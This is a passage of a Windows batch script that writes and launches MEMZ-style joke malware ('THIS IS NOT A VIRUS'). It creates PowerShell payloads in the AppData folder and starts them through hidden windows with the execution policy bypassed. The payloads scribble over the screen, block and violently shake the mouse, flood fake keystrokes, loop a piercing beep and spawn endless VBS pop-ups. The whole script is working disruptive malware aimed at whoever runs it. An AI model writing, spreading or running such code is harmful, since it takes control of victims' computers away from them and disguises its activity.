echo         }                                                                                                                                                                                             >> FAKEMEMZ4.ps1
echo         [System.Drawing.Graphics]::FromHdc($hDC).ReleaseHdc()                                                                                                                                         >> FAKEMEMZ4.ps1
echo     }                                                                                                                                                                                                 >> FAKEMEMZ4.ps1
echo }                                                                                                                                                                                                     >> FAKEMEMZ4.ps1

echo Add-Type -AssemblyName System.Drawing                                           > FAKEMEMZ6.ps1
echo Add-Type -AssemblyName System.Windows.Forms                                     >> FAKEMEMZ6.ps1
echo $backgroundImagePath = "$env:APPDATA\ren\error.png"                             >> FAKEMEMZ6.ps1
echo $backgroundImagePath2 = "$env:APPDATA\ren\bit.png"                              >> FAKEMEMZ6.ps1
echo # 이미지 로드                                                                        >> FAKEMEMZ6.ps1
echo $backgroundImage = [System.Drawing.Image]::FromFile($backgroundImagePath)       >> FAKEMEMZ6.ps1
echo $backgroundImage2 = [System.Drawing.Image]::FromFile($backgroundImagePath2)     >> FAKEMEMZ6.ps1
echo # 폼 생성                                                                          >> FAKEMEMZ6.ps1
echo $form = New-Object System.Windows.Forms.Form                                    >> FAKEMEMZ6.ps1
echo $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None            >> FAKEMEMZ6.ps1
echo $form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual          >> FAKEMEMZ6.ps1
echo $form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized           >> FAKEMEMZ6.ps1
echo $form.TransparencyKey = [System.Drawing.Color]::White                           >> FAKEMEMZ6.ps1
echo $form.BackColor = [System.Drawing.Color]::White                                 >> FAKEMEMZ6.ps1
echo $form.BackgroundImage = $backgroundImage2                                       >> FAKEMEMZ6.ps1
echo # 이미지 그리기 함수 정의                                                                 >> FAKEMEMZ6.ps1
echo function DrawImageOnForm {                                                      >> FAKEMEMZ6.ps1
echo     $graphics = [System.Drawing.Graphics]::FromHwnd($form.Handle)               >> FAKEMEMZ6.ps1
echo     $mousePosition = [System.Windows.Forms.Cursor]::Position                    >> FAKEMEMZ6.ps1
echo     $graphics.DrawImage($backgroundImage, $mousePosition.X, $mousePosition.Y)   >> FAKEMEMZ6.ps1
echo     $graphics.Dispose()                                                         >> FAKEMEMZ6.ps1
echo }                                                                               >> FAKEMEMZ6.ps1
echo # 마우스 이동 이벤트 핸들러 등록                                                             >> FAKEMEMZ6.ps1
echo $form.Add_MouseMove({                                                           >> FAKEMEMZ6.ps1
echo     DrawImageOnForm                                                             >> FAKEMEMZ6.ps1
echo })                                                                              >> FAKEMEMZ6.ps1
echo # 폼 표시                                                                          >> FAKEMEMZ6.ps1
echo $form.Show()                                                                    >> FAKEMEMZ6.ps1
echo # 메시지 루프                                                                        >> FAKEMEMZ6.ps1
echo while ($form.Visible) {                                                         >> FAKEMEMZ6.ps1
echo     [System.Windows.Forms.Application]::DoEvents()                              >> FAKEMEMZ6.ps1
echo }                                                                               >> FAKEMEMZ6.ps1
echo # 폼 해제                                                                          >> FAKEMEMZ6.ps1
echo $form.Dispose()                                                                 >> FAKEMEMZ6.ps1
echo                                                                                 >> FAKEMEMZ6.ps1



echo Add-Type -AssemblyName System.Windows.Forms                                   >> mouse.ps1
echo # 마우스 입력을 막을 폼 생성                                                             >> mouse.ps1
echo $form = New-Object System.Windows.Forms.Form                                  >> mouse.ps1
echo $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None          >> mouse.ps1
echo $form.BackColor = [System.Drawing.Color]::White                               >> mouse.ps1
echo $form.Opacity = 0.01                                                          >> mouse.ps1
echo $form.StartPosition = "Manual"                                                >> mouse.ps1
echo $form.Top = 0                                                                 >> mouse.ps1
echo $form.Left = 0                                                                >> mouse.ps1
echo $form.Width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width       >> mouse.ps1
echo $form.Height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height     >> mouse.ps1
echo # 마우스 입력 막기 이벤트 핸들러 등록                                                        >> mouse.ps1
echo $eventManager = [System.Windows.Forms.Application]::AddMessageFilter(         >> mouse.ps1
echo     (New-Object System.Windows.Forms.MouseInputFilter $form))                 >> mouse.ps1
echo # 폼 열기                                                                        >> mouse.ps1
echo $form.ShowDialog()                                                            >> mouse.ps1
echo # 이벤트 핸들러 해제 및 폼 닫기                                                           >> mouse.ps1
echo [System.Windows.Forms.Application]::RemoveMessageFilter($eventManager)        >> mouse.ps1
echo $form.Dispose()                                                               >> mouse.ps1

echo Add-Type -AssemblyName System.Drawing                                                                                               > blood.ps1
echo Add-Type -AssemblyName System.Windows.Forms                                                                                         >> blood.ps1
echo $width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width                                                                  >> blood.ps1
echo $height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height                                                                >> blood.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                                        >> blood.ps1
echo $form.WindowState ="Maximized"                                                                                                     >> blood.ps1
echo $form.FormBorderStyle = ^[System.Windows.Forms.FormBorderStyle]::None                                                                >> blood.ps1
echo $form.BackColor =^[System.Drawing.Color]::Transparent                                                                               >> blood.ps1
echo $form.TransparencyKey = $form.BackColor                                                                                             >> blood.ps1
echo $form.TopMost = $true                                                                                                               >> blood.ps1
echo $random = New-Object System.Random                                                                                                  >> blood.ps1
echo # 펜 객체 생성                                                                                                                           >> blood.ps1
echo $pen = ^New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb($random.Next(256), $random.Next(256), $random.Next(256)))     >> blood.ps1
echo # Paint 이벤트 핸들러 등록                                                                                                                  >> blood.ps1
echo $form.Add_Paint^({                                                                                                                   >> blood.ps1
echo     $graphics = $_.Graphics                                                                                                         >> blood.ps1
echo     for ($i = 0; $i -lt 20000; $i++) ^{                                                                                             >> blood.ps1
echo         # 이주석을 보고있다는 뜻은 코드를 열어봤다는 뜻이겠군                                                                >> blood.ps1
echo         $pen.Color = [System.Drawing.Color]^::Red                                                                                    >> blood.ps1
echo         $x = $random.Next($width)                                                                                                   >> blood.ps1
echo         $y = $random.Next($height)                                                                                                  >> blood.ps1
echo         $graphics.DrawRectangle($pen, $x, $y, 1, 1)                                                                                 >> blood.ps1
echo     ^}                                                                                                                               >> blood.ps1
echo ^})                                                                                                                                  >> blood.ps1
echo $form.ShowDialog() ^| Out-Null                                                                                                       >> blood.ps1

echo # 필요한 Windows API 함수와 상수 정의                                                                                > snake.ps1
echo $signature = @^"                                                                                           >> snake.ps1
echo [DllImport("user32.dll")]                                                                                  >> snake.ps1
echo public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);            >> snake.ps1
echo [DllImport("kernel32.dll")]                                                                                >> snake.ps1
echo public static extern uint GetTickCount();                                                                  >> snake.ps1
echo ^"@                                                                                                        >> snake.ps1
echo $api = Add-Type -MemberDefinition $signature -Name "Win32" -Namespace Win32Functions -PassThru             >> snake.ps1
echo $VK_SHIFT = 0x10   # Shift 키                                                                               >> snake.ps1
echo $VK_CAPITAL = 0x14   # Caps Lock 키                                                                         >> snake.ps1
echo $KEYEVENTF_KEYDOWN = 0    # 키 누름 이벤트                                                                       >> snake.ps1
echo $KEYEVENTF_KEYUP = 2    # 키 뗌 이벤트                                                                          >> snake.ps1
echo # 키를 누르고 뗄 함수                                                                                              >> snake.ps1
echo function PressAndReleaseKey($key) {                                                                        >> snake.ps1
echo     $api::keybd_event($key, 0, $KEYEVENTF_KEYDOWN, [UIntPtr]::Zero)                                        >> snake.ps1
echo     Start-Sleep -Milliseconds 50                                                                           >> snake.ps1
echo     $api::keybd_event($key, 0, $KEYEVENTF_KEYUP, [UIntPtr]::Zero)                                          >> snake.ps1
echo }                                                                                                          >> snake.ps1
echo # 문자열을 키보드 입력으로 보내는 함수                                                                                     >> snake.ps1
echo function SendStringAsKeyboardInput($text) {                                                                >> snake.ps1
echo     $encoding = [System.Text.Encoding]::Default                                                            >> snake.ps1
echo     $bytes = $encoding.GetBytes($text)                                                                     >> snake.ps1
echo     foreach ($byte in $bytes) {                                                                            >> snake.ps1
echo         PressAndReleaseKey $byte                                                                           >> snake.ps1
echo     }                                                                                                      >> snake.ps1
echo }                                                                                                          >> snake.ps1
echo # "THIS IS NOT A VIRUS"를 계속해서 키보드 입력으로 보내는 함수                                                              >> snake.ps1
echo function RepeatSendString($text) {                                                                         >> snake.ps1
echo     while ($true) {                                                                                        >> snake.ps1
echo         SendStringAsKeyboardInput $text                                                                    >> snake.ps1
echo         Start-Sleep -Milliseconds 1                                                                        >> snake.ps1
echo     }                                                                                                      >> snake.ps1
echo }                                                                                                          >> snake.ps1
echo # 반복 실행 시작                                                                                                 >> snake.ps1
echo RepeatSendString "THIS IS NOT A VIRUS"                                                                     >> snake.ps1
echo                                                                                                            >> snake.ps1

echo Add-Type -TypeDefinition @^"                                                         >> MOVEMOUSE.ps1
echo using System;                                                                        >> MOVEMOUSE.ps1
echo using System.Runtime.InteropServices;                                                >> MOVEMOUSE.ps1
echo public class MouseShaker                                                             >> MOVEMOUSE.ps1
echo {                                                                                    >> MOVEMOUSE.ps1
echo     [DllImport("user32.dll")]                                                        >> MOVEMOUSE.ps1
echo     public static extern bool GetCursorPos(out POINT lpPoint);                       >> MOVEMOUSE.ps1
echo     [DllImport("user32.dll")]                                                        >> MOVEMOUSE.ps1
echo     public static extern bool SetCursorPos(int x, int y);                            >> MOVEMOUSE.ps1
echo     [StructLayout(LayoutKind.Sequential)]                                            >> MOVEMOUSE.ps1
echo     public struct POINT                                                              >> MOVEMOUSE.ps1
echo     {                                                                                >> MOVEMOUSE.ps1
echo         public int X;                                                                >> MOVEMOUSE.ps1
echo         public int Y;                                                                >> MOVEMOUSE.ps1
echo     }                                                                                >> MOVEMOUSE.ps1
echo     public static void ShakeMouse(int duration, int shakeAmount)                     >> MOVEMOUSE.ps1
echo     {                                                                                >> MOVEMOUSE.ps1
echo         Random random = new Random();                                                >> MOVEMOUSE.ps1
echo         POINT originalPos;                                                           >> MOVEMOUSE.ps1
echo         GetCursorPos(out originalPos);                                               >> MOVEMOUSE.ps1
echo         DateTime endTime = DateTime.Now.AddMilliseconds(duration);                   >> MOVEMOUSE.ps1
echo         while (DateTime.Now ^< endTime)                                               >> MOVEMOUSE.ps1
echo         {                                                                            >> MOVEMOUSE.ps1
echo             int newX = originalPos.X + random.Next(-shakeAmount, shakeAmount);       >> MOVEMOUSE.ps1
echo             int newY = originalPos.Y + random.Next(-shakeAmount, shakeAmount);       >> MOVEMOUSE.ps1
echo             SetCursorPos(newX, newY);                                                >> MOVEMOUSE.ps1
echo             System.Threading.Thread.Sleep(10);                                       >> MOVEMOUSE.ps1
echo         }                                                                            >> MOVEMOUSE.ps1
echo         SetCursorPos(originalPos.X, originalPos.Y);                                  >> MOVEMOUSE.ps1
echo     }                                                                                >> MOVEMOUSE.ps1
echo }                                                                                    >> MOVEMOUSE.ps1
echo ^"@                                                                                  >> MOVEMOUSE.ps1
echo # 마우스 흔들기 호출 (지속 시간: 5초, 흔들림 정도: 10 픽셀)                                              >> MOVEMOUSE.ps1
echo [MouseShaker]::ShakeMouse(5000, 1)                                                   >> MOVEMOUSE.ps1
echo [MouseShaker]::ShakeMouse(6000, 5)                                                   >> MOVEMOUSE.ps1
echo [MouseShaker]::ShakeMouse(10000, 10)                                                  >> MOVEMOUSE.ps1
echo [MouseShaker]::ShakeMouse(5000, 20)                                                  >> MOVEMOUSE.ps1
echo [MouseShaker]::ShakeMouse(5000, 30)                                                  >> MOVEMOUSE.ps1
echo [MouseShaker]::ShakeMouse(5000, 60)                                                  >> MOVEMOUSE.ps1
echo [MouseShaker]::ShakeMouse(5000, 120)                                                 >> MOVEMOUSE.ps1
echo [MouseShaker]::ShakeMouse(5000, 120)                                                 >> MOVEMOUSE.ps1
echo [MouseShaker]::ShakeMouse(540000, 820)                                               >> MOVEMOUSE.ps1

echo cd %appdata%\ren\ > MOVEMOUSE.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> MOVEMOUSE.bat
set "ea=%appdata%\ren\MOVEMOUSE.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> MOVEMOUSE.bat

echo cd %appdata%\ren\ > dontmoveM.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> dontmoveM.bat
set "ea=%appdata%\ren\mouse.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> dontmoveM.bat

echo cd %appdata%\ren\ > blood.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> blood.bat
set "ea=%appdata%\ren\blood.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> blood.bat

echo cd %appdata%\ren\ > snake.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> snake.bat
set "ea=%appdata%\ren\snake.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> snake.bat

echo cd %appdata%\ren\ > FAKEMEMZ.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> FAKEMEMZ.bat
set "ea=%appdata%\ren\FAKEMEMZ.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> FAKEMEMZ.bat

echo cd %appdata%\ren\ > FAKEMEMZ2.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> FAKEMEMZ2.bat
set "ea=%appdata%\ren\FAKEMEMZ2.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> FAKEMEMZ2.bat

echo cd %appdata%\ren\ > FAKEMEMZ3.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> FAKEMEMZ3.bat
set "ea=%appdata%\ren\FAKEMEMZ3.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> FAKEMEMZ3.bat

echo cd %appdata%\ren\ > FAKEMEMZ4.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> FAKEMEMZ4.bat
set "ea=%appdata%\ren\FAKEMEMZ4.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> FAKEMEMZ4.bat

echo cd %appdata%\ren\ > FAKEMEMZ5.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> FAKEMEMZ5.bat
set "ea=%appdata%\ren\FAKEMEMZ5.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> FAKEMEMZ5.bat

echo cd %appdata%\ren\ > FAKEMEMZ6.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> FAKEMEMZ6.bat
set "ea=%appdata%\ren\FAKEMEMZ6.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> FAKEMEMZ6.bat

set "e=%appdata%\ren\error.ps1"
echo @echo off > error.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> error.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%e%'" >> error.bat

set "e=%appdata%\ren\benben.ps1"
echo @echo off > sing.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> sing.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%e%'" >> sing.bat

echo $shell = New-Object -ComObject "Shell.Application" > changreset.ps1
echo $shell.ToggleDesktop() >> changreset.ps1
echo cd %appdata%\ren\ > changreset.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> changreset.bat
set "eeaa=%appdata%\ren\changreset.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%eeaa%'" >> changreset.bat

echo @echo off > angks.bat
echo cd %appdata%\ren >> angks.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> angks.bat
echo :a >> angks.bat
echo start THISISNOTVIRUS.vbs  >> angks.bat
echo timeout 2 >> angks.bat
echo goto a >> angks.bat
echo @echo off > BEB.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> BEB.bat
echo powershell.exe -command "& { while ($true) { [System.Console]::Beep(32767, 32767) } }" >> BEB.bat
start /min changreset.bat
start /min https://www.google.com/search?q=what+is+MEMZ&tbm=isch&ved=2ahUKEwj1nYny1pz_AhW6mFYBHaqfAcgQ2-cCegQIABAA&oq=what+is+MEMZ&gs_lcp=CgNpbWcQAzIHCAAQExCABDIHCAAQExCABDoICAAQgAQQsQM6BQgAEIAEOgsIABCABBCxAxCDAToECAAQHlCvAVioDmDrD2gAcAB4AIABeYgB9wqSAQQxLjEymAEAoAEBqgELZ3dzLXdpei1pbWfAAQE&sclient=img&ei=G7t1ZLWkBrqx2roPqr-GwAw&bih=959&biw=1232#imgrc=U7PdXoRfVYFeMM
timeout 7
start /min MOVEMOUSE.bat
start /min angks.bat
start /min angks.bat
start /min angks.bat
start /min angks.bat
timeout 7
start /min https://www.google.com/search?q=this+is+not+a+virus&oq=this+is+not+a+virus&aqs=chrome..69i57j0i19i512j0i19i30j0i8i19i30j0i19i30j69i60l2.1199j0j7&sourceid=chrome&ie=UTF-8
timeout 6
start /min https://www.google.com/search?q=how+to+delte+THISISNOT+A+VIRUS%3F&sxsrf=APwXEddYUnHW3GiZUqnyi3roO6v7Zeh5Rg%3A1685437469880&ei=Hbx1ZJW2Ndf6hwOT44GwCQ&ved=0ahUKEwjVuLvt15z_AhVX_WEKHZNxAJYQ4dUDCA8&uact=5&oq=how+to+delte+THISISNOT+A+VIRUS%3F&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIHCCEQoAEQCjIHCCEQoAEQCjIHCCEQoAEQCjIHCCEQoAEQCjoHCCMQsAMQJzoKCAAQRxDWBBCwAzoHCAAQgAQQCjoFCC4QgAQ6BQgAEIAEOhAIIxCKBRAnEIsDEKYDEKgDOgQIIxAnOhQILhCDARCxAxCABBCLAxCoAxCZAzoZCC4QgAQQFBCHAhCxAxCDARCLAxCYAxCoAzoOCC4QgAQQiwMQqAMQmAM6CAgAEIAEEIsDOg4ILhCABBCLAxCYAxCoAzoRCC4QgAQQ1AIQiwMQqAMQmAM6CwguEIAEELEDEIMBOhEILhCABBCxAxCDARDHARDRAzoHCAAQigUQQzoNCC4QigUQxwEQ0QMQQzoLCAAQgAQQsQMQgwE6BAgAEAM6BwgjEOoCECc6CAgAEIAEELEDOg4ILhCABBCxAxCDARDUAjoICC4QgAQQ1AI6FgguEIAEENQCEJcFENwEEN4EEOAEGAE6CggAEIAEEBQQhwI6BwgAEA0QgAQ6BggAEB4QDToGCAAQHhAKOgkIABANEBMQgARKBAhBGABQiwNYiWpg1GxoB3ABeACAAaEBiAHyI5IBBDAuMzeYAQCgAQGwAQq4AQLAAQHIAQraAQYIARABGBQ&sclient=gws-wiz-serp
timeout 6
start /min FAKEMEMZ.bat
https://www.google.com/search?q=WHAT+IS+TIN+EXE&sxsrf=APwXEdetn2lj9on-oVVrQor73MrhqyRBCw:1685448261901&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiVkcCHgJ3_AhWXBd4KHSrnCtgQ_AUoAXoECAEQAw&biw=1232&bih=959&dpr=1
timeout 6
start /min FAKEMEMZ5.bat
start https://www.google.com/search?q=what+is+choda100&sxsrf=APwXEddmjizw4sTfsKIcLzcV-04Vo6infg%3A1685437716764&ei=FL11ZOOrLraT1e8P0o648A8&ved=0ahUKEwjjhZjj2Jz_AhW2SfUHHVIHDv4Q4dUDCA8&uact=5&oq=what+is+choda100&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIFCCEQoAEyBQghEKABOgQIIxAnOgsIABCABBCxAxCDAToHCAAQigUQQzoRCC4QgAQQsQMQgwEQxwEQ0QM6BQguEIAEOgQIABADOgsILhCABBCxAxCDAToOCC4QgAQQsQMQgwEQ1AI6CAgAEIAEELEDOgUIABCABDoICC4QgAQQ1AI6BwgAEBMQgAQ6CQgAEBMQgAQQCjoNCAAQCBAeEPEEEBMQCkoECEEYAFAAWJYTYOITaABwAHgAgAGcAYgBlA-SAQQwLjE1mAEAoAEBwAEB&sclient=gws-wiz-serp
timeout 3
start /min BEB.bat
start /min FAKEMEMZ4.bat
start /min FAKEMEMZ6.bat
start /min error.bat
start /min error.bat
start /min sing.bat
start /min blood.bat
start /min FAKEMEMZ1.bat
start /min FAKEMEMZ2.bat
start /min FAKEMEMZ3.bat
start /min dontmoveM.bat
start /min dontmoveM.bat
start /min snake.bat



